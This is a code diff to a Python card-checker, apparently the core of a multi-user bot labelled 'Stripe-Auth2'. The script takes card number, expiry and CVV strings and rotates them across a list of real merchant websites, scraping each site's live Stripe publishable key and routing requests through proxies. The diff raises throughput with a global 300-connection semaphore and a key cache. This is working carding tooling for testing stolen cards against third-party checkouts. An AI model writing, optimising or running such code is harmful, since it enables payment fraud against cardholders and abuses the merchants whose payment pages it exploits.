@@ -1,4 +1,4 @@
-# OGGY ST AUTHH — stripe auth2 core
+# checker.py — optimized for high compute (queue worker pool, pk cache, global sem)
 import re
 import uuid
 import string
@@ -12,6 +12,9 @@ try:
     HAS_SOCKS = True
 except ImportError:
     HAS_SOCKS = False
+
+# Global max connections across the ENTIRE bot (all users combined).
+GLOBAL_SEM = asyncio.Semaphore(300)
 
 SITES = [
     "https://innercitytigers.com",
@@ -34,6 +37,9 @@ NONCE_PATTERNS = [
 ]
 
 BAD_RESPONSES = {"", "0", "null", "false", "-1", "undefined"}
+
+# Cache PK so we don't scrape the site every time
+PK_CACHE = {}
 
 
 def _rand_str(n=10):
@@ -78,6 +84,9 @@ def _req_proxy(proxy_url):
 
 
 async def _extract_stripe_pk(session, site, headers, proxy_arg):
+    if site in PK_CACHE:
+        return PK_CACHE[site]
+        
     for url in (f'{site}/my-account/add-payment-method/',
                 f'{site}/my-account/', f'{site}/checkout/', f'{site}/'):
         try:
@@ -85,9 +94,13 @@ async def _extract_stripe_pk(session, site, headers, proxy_arg):
                                    allow_redirects=True, proxy=proxy_arg, timeout=8) as r:
                 text = await r.text()
             m = re.search(r'pk_live_[a-zA-Z0-9]{20,}', text)
-            if m: return m.group(0)
+            if m:
+                PK_CACHE[site] = m.group(0)
+                return m.group(0)
             m = re.search(r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"', text)
-            if m: return m.group(1)
+            if m:
+                PK_CACHE[site] = m.group(1)
+                return m.group(1)
         except Exception: continue
     return None
 
@@ -255,20 +268,31 @@ def _classify(text):
 
 
 async def stripe_auth2_check(card_str, proxy_str=None):
-    parts = card_str.strip().split('|')
-    if len(parts) != 4:
-        return {"Response": "Invalid card format", "Gateway": "Stripe-Auth2", "Price": "$0"}
-    cc, mm, yy, cvv = (p.strip() for p in parts)
-    cc = cc.replace(' ', '')
-    mm = mm.zfill(2)
-    if len(yy) == 2: yy = '20' + yy
-    sites = list(SITES)
-    random.shuffle(sites)
-    for site in sites:
+    async with GLOBAL_SEM:
         try:
-            r = await _try_site(site, cc, mm, yy, cvv, proxy_str)
-            if r and not _is_bad_body(r.get("Response", "")):
-                return r
-        except Exception: continue
-    return {"Response": "All sites failed — no valid response",
-            "Gateway": "Stripe-Auth2", "Price": "$0"}
+            parts = card_str.strip().split('|')
+            if len(parts) != 4:
+                return {"Response": "Invalid card format", "Gateway": "Stripe-Auth2", "Price": "$0"}
+            cc, mm, yy, cvv = parts
+            cc = cc.strip().replace(' ', '')
+            mm = mm.strip().zfill(2)
+            yy = yy.strip()
+            cvv = cvv.strip()
+            if len(yy) == 2: yy = '20' + yy
+
+            proxy_url = proxy_str if proxy_str else None
+            sites = list(SITES)
+            random.shuffle(sites)
+
+            for site_url in sites:
+                try:
+                    result = await _try_site(site_url, cc, mm, yy, cvv, proxy_url)
+                    if result is None: continue
+                    if not isinstance(result, dict): continue
+                    if _is_bad_body(result.get("Response", "")): continue
+                    return result
+                except Exception: continue
+
+            return {"Response": "All sites failed — no valid response", "Gateway": "Stripe-Auth2", "Price": "$0"}
+        except Exception as e:
+            return {"Response": f"Exception: {str(e)[:80]}", "Gateway": "Stripe-Auth2", "Price": "$0"}
